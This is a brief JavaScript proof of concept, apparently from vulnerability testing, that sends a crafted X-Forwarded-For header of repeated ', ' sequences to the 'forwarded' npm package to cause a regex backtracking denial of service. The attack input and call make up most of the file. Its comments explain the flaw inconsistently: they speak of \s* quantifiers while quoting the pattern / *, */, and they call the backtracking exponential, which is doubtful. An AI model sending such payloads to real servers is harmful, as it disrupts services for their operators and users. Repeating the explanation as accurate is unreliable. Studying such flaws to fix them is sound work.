  const forwarded = require('forwarded');

  // The parse() function relies on the regular expression / *, */ to split header values.
  // This pattern contains optional whitespace quantifiers (\s*) surrounding a literal comma.
  // During .split(), the regex engine must deterministically assign adjacent whitespace
  // to either the leading \s* or the trailing \s* of each match. When processing highly
  // repetitive input like ", " followed by trailing spaces, this ambiguity creates a
  // combinatorial explosion at the boundary where no delimiter is found. Consequently,
  // the engine triggers catastrophic exponential backtracking to explore every possible
  // whitespace assignment permutation before finally failing.

  const maliciousHeader = ", ".repeat(4000) + " ";

  // Invoking forwarded() delegates directly to parse(), which executes:
  // header.trim().split(TOKEN_LIST_REGEXP).filter(Boolean).reverse()
  // Supplying the crafted input forces the vulnerable execution path. When executed with
  // Node.js flag --regexp-backtracks-before-fallback=30000, this will reliably exceed the
  // configured backtrack limit and cause the engine to abort with a RangeError.
  return forwarded({ 
    headers: { 'x-forwarded-for': maliciousHeader }, 
    connection: { remoteAddress: '127.0.0.1' } 
  });
